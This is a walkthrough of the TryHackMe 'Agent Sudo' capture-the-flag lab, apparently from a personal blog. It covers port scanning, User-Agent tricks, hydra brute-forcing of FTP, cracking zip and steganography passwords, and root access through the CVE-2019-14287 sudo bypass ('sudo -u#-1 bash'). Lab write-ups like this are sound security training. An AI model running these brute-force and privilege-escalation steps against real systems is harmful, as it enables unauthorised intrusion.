---
title: Walkthrough - Agent Sudo
published: true
---

You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth. 

![0xskar](/assets/agent-sudo01.png)

Enumerate/Exploit/Brute-Force/Hash-Cracking

* * *

## Enumerate

##   How many open ports?

- ``sudo nmap -sS -p- -T4 10.10.97.21 -vvv``
- ``sudo nmap -sC -sV -O -p21,22,80 10.10.97.21``

```shell
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

##   How you redirect yourself to a secret page?

- Changing the User-Agent header to C will let us see ``http://10.10.97.21/agent_C_attention.php`` where we get some more hints

> Attention chris,

> Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

> From,
> Agent R 

##   What is the agent name?

- Chris

* * * 

## Hash cracking and brute-force

Done enumerate the machine? Time to brute your way out.

##   FTP password

- ``hydra -l chris -P /usr/share/seclists/Passwords/rockyou.txt 10.10.97.21 ftp``
- ``mget *.*``

```shell
┌──(0xskar㉿cocokali)-[~/Documents/TryHackMe/Agent-Sudo]
└─$ cat To_agentJ.txt                                                                                  
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

- ``binwalk -e cutie.png``
- ``unzip cutie.png``

##   Zip file password

- ``ssh2john 8702.zip > 8702.hash``
- ``john 8702.hash --wordlist=/usr/share/seclists/Passwords/rockyou.txt``

##   steg password

- steg is hiddin inside the other image
- ``stegseek cute-alien.jpg /usr/share/seclists/passwords/rockyou.txt``

```shell
cat cute-alien.jpg.out 
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

##   Who is the other agent (in full name)?

- james  

##   SSH password

- hackerrules!

* * * 

## Hash cracking and brute-force

##   What is the user flag?

![0xskar](/assets/agent-sudo02.png)

##   What is the incident of the photo called?

- ``scp james@10.10.53.61:/home/james/Alien_autospy.jpg .``
- google reverse image search > images > upload an image
- foxnews
- Roswell alien autopsy

* * * 

## Privilege Escalation

- sudo -l gives us ``(ALL, !root) /bin/bash``
- linpeas give us 
- sudo -V give us 1.8.21p2
- [https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability](https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability)
- ``sudo -u#-1 bash``

* * * 